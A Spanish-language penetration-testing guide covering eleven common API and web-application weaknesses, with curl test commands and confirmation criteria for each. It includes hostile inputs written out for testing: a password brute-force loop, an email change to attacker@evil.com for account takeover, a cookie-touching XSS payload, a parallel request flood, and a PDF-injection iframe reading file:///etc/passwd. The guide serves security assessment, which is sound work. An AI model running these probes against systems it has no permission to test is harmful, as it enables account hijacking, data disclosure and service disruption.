# Vectores de Seguridad Universales — Guía de Detección Activa

> Esta guía contiene métodos genéricos de testeo con curl y criterios de confirmación para los 11 vectores de seguridad críticos (QD-XX).
> Utiliza esta referencia para diseñar pruebas de penetración en cualquier API y aplicación web.

---

## QD-01 — Client-Side Authorization Bypass
**Riesgo**: El frontend de la aplicación toma decisiones de navegación o renderizado basándose exclusivamente en los datos de privilegios retornados en la respuesta de login (ej. un JSON con `{ "role": "user", "isAdmin": false }`) guardados localmente. Al interceptar la respuesta HTTP del login con un proxy local (ej. Burp Suite, OWASP ZAP), un atacante puede alterar estos valores para habilitar menús y vistas restringidas en el cliente.

**Test Genérico de Confirmación:**
```bash
# 1. Realizar una petición de login normal con un usuario sin privilegios:
curl -s -X POST {{BASE_URL}}/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"operator","password":"Password123"}'

# 2. Configurar una regla de reemplazo (Match & Replace) en tu proxy:
#    Reemplazar: "isAdmin": false  ->  "isAdmin": true
#    Reemplazar: "role": "user"    ->  "role": "admin"
# 3. Navegar a las secciones administrativas de la interfaz web.
# Si el frontend renderiza el panel y permite el flujo visual sin rechazarlo → QD-01 CONFIRMADO
```

**Criterio de Fallo**: Confianza ciega en los datos del lado del cliente sin validación server-side.

---

## QD-02 — Exposición de Secretos en Configuración
**Riesgo**: Archivos públicos, repositorios, endpoints de depuración o variables de configuración expuestas en la API (ej. `/api/settings`, `/api/config`) revelan secretos en texto plano, tales como credenciales de base de datos, API keys, credenciales SMTP o llaves privadas de almacenamiento.

**Test Genérico de Confirmación:**
```bash
# Consultar endpoints de parámetros/configuraciones con un token de bajo privilegio:
curl -H "Authorization: Bearer {{TOKEN}}" {{BASE_URL}}/api/config | \
  jq '.. | select(type == "string" and (test("secret|password|key|token|smtp|database"; "i")))'

# Si responde devolviendo credenciales operativas legibles → QD-02 CONFIRMADO
```

---

## QD-03 — Account Takeover Chain (ATO)
**Riesgo**: Cadena de explotación en la que se correlacionan tres fallos para secuestrar cuentas:
1. **Enumeración de usuarios**: La API expone listados de correos y usernames a perfiles no autorizados (`GET /api/users`).
2. **Fuerza bruta**: No hay rate limits al autenticarse.
3. **Cambio de email vulnerable**: El endpoint para actualizar el correo de la cuenta no solicita la contraseña actual (`current_password`), permitiendo que una sesión secuestrada cambie el correo a uno del atacante y resetee la contraseña para apropiarse definitivamente de la cuenta.

**Paso 1 — Enumeración de usuarios:**
```bash
curl -H "Authorization: Bearer {{TOKEN}}" {{BASE_URL}}/api/users
# Si devuelve el catálogo de emails de los usuarios sin verificar privilegios → QD-03 paso 1 CONFIRMADO
```

**Paso 2 — Fuerza Bruta de Login:**
```bash
# Realizar intentos de autenticación en bucle
for pass in Pass1 Pass2 Pass3 Pass4 Pass5; do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST {{BASE_URL}}/api/login \
    -d "{\"username\":\"admin\",\"password\":\"$pass\"}"
done
# Si realiza múltiples peticiones consecutivas sin bloqueo temporal (429) → QD-03 paso 2 CONFIRMADO
```

**Paso 3 — Actualización de email insegura:**
```bash
curl -X PUT {{BASE_URL}}/api/profile/email \
  -H "Authorization: Bearer {{TOKEN}}" \
  -d '{"email":"attacker@evil.com"}'
# Si responde con éxito (HTTP 200) sin exigir la contraseña actual → QD-03 paso 3 CONFIRMADO
```

---

## QD-04 — Broken Function Level Authorization (BFLA)
**Riesgo**: El servidor expone funciones administrativas o rutas especiales bajo premisas únicamente de ocultación client-side. Si un atacante descubre los endpoints (ej. `/api/admin/delete-user`), puede realizar peticiones directas de bajo privilegio con éxito porque el servidor no comprueba los roles.

**Test Genérico de Confirmación:**
```bash
# Intentar consumir un recurso exclusivo de administrador usando un token de operador ordinario:
curl -X POST {{BASE_URL}}/api/admin/settings \
  -H "Authorization: Bearer {{OPERATOR_TOKEN}}" \
  -H "Content-Type: application/json" \
  -d '{"maintenance_mode": true}'

# Si responde con éxito (HTTP 200 / 201) → QD-04 CONFIRMADO
```

---

## QD-05 — Broken Object Level Authorization (BOLA / IDOR)
**Riesgo**: La aplicación utiliza IDs numéricos secuenciales en rutas RESTful para recursos confidenciales (ej. `GET /api/invoices/10`) y los devuelve sin comprobar si el usuario que realiza la solicitud es el propietario del objeto o pertenece al mismo tenant.

**Test Genérico de Confirmación:**
```bash
# Iniciar sesión como Usuario A (id de factura propia = 10)
# Intentar solicitar el ID 11 (factura del Usuario B):
curl -s -I -H "Authorization: Bearer {{TOKEN_USUARIO_A}}" \
  "{{BASE_URL}}/api/invoices/11"

# Si responde HTTP 200 OK y devuelve el contenido de otra cuenta → QD-05 CONFIRMADO
```

---

## QD-06 — Cross-Portal Privilege Escalation
**Riesgo**: Múltiples aplicaciones cliente (ej. un Portal Cliente y un Portal Administrador) consumen el mismo backend. Si el backend emite tokens sin calificar el scope del portal de origen, un token obtenido en el portal de bajo rango (cliente) puede ser usado para consumir servicios exclusivos del portal de administración.

**Test Genérico de Confirmación:**
```bash
# Obtener token de cliente y enviarlo a rutas administrativas del backend:
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer {{CLIENT_TOKEN}}" \
  "{{BASE_URL}}/api/admin/users"

# Si responde HTTP 200 OK en lugar de 403 Forbidden → QD-06 CONFIRMADO
```

---

## QD-07 — Stored Cross-Site Scripting (Stored XSS)
**Riesgo**: Las entradas libres (ej. nombres de perfil, comentarios) se almacenan sin sanitizar en la base de datos y posteriormente se renderizan directamente en la página web mediante directivas inseguras que ejecutan HTML y scripts maliciosos.

**Test Genérico de Confirmación:**
```bash
# Inyectar payload script en un campo de entrada:
curl -X POST {{BASE_URL}}/api/comments \
  -H "Authorization: Bearer {{TOKEN}}" \
  -d '{"text":"<img src=x onerror=alert(document.cookie)>"}'

# Consultar el listado de comentarios:
curl -s {{BASE_URL}}/api/comments | grep -o "<img src=x"
# Si el código HTML se devuelve crudo sin codificar ni limpiar → QD-07 CONFIRMADO
```

---

## QD-08 — Rate Limiting Ausente
**Riesgo**: Carencia de límites en peticiones concurrentes y repetidas sobre endpoints sensibles, facilitando ataques de denegación de servicio (DoS) o fuerza bruta a nivel lógico o de almacenamiento.

**Test Genérico de Confirmación:**
```bash
# Enviar 50 peticiones simultáneas en paralelo:
for i in {1..50}; do
  curl -s -o /dev/null -w "%{http_code}\n" "{{BASE_URL}}/api/pdf/generate/10" &
done; wait

# Si todas las respuestas retornan HTTP 200 sin bloqueos (HTTP 429) → QD-08 CONFIRMADO
```

---

## QD-09 — Exposición de Privilegios en Respuestas
**Riesgo**: El servidor devuelve toda la estructura detallada de permisos y roles del usuario en la respuesta de login, permitiendo al atacante replicarla e inyectar permisos client-side para alterar menús de forma visual.

**Test Genérico de Confirmación:**
```bash
curl -s -X POST {{BASE_URL}}/api/login -d '{"user":"u","pass":"p"}' | jq '{permissions, roles, is_admin}'
# Si la estructura devuelve variables de booleanos o colecciones de permisos editables → QD-09 CONFIRMADO
```

---

## QD-10 — Fugas de Información de Depuración (Debug)
**Riesgo**: Exposición de stack traces, variables de configuración en tiempo de ejecución, consultas SQL internas o paths del sistema operativo ante entradas defectuosas o JSONs malformados en entornos de producción.

**Test Genérico de Confirmación:**
```bash
# Enviar un JSON incompleto o sintácticamente roto:
curl -s -X POST {{BASE_URL}}/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":'

# Buscar palabras clave en la respuesta:
# grep "stack" o "trace" o "SQL" o "line" o "file"
# Si responde con los detalles de desarrollo del backend → QD-10 CONFIRMADO
```

---

## QD-11 — HTML/CSS Injection en Generadores de PDF
**Riesgo**: Los generadores de archivos PDF en el servidor procesan parámetros que contienen etiquetas HTML y estilos CSS directamente. Esto facilita ataques de phishing visual e inyecciones de redirección o robo de recursos locales.

**Test Genérico de Confirmación:**
```bash
# Enviar código HTML formateado en las entradas:
curl -X POST {{BASE_URL}}/api/reports/pdf \
  -d '{"report_title":"<h1>INJECTED</h1><iframe src=\"file:///etc/passwd\"></iframe>"}'
# Si el PDF generado renderiza el título formateado o incluye datos de archivos locales → QD-11 CONFIRMADO
```
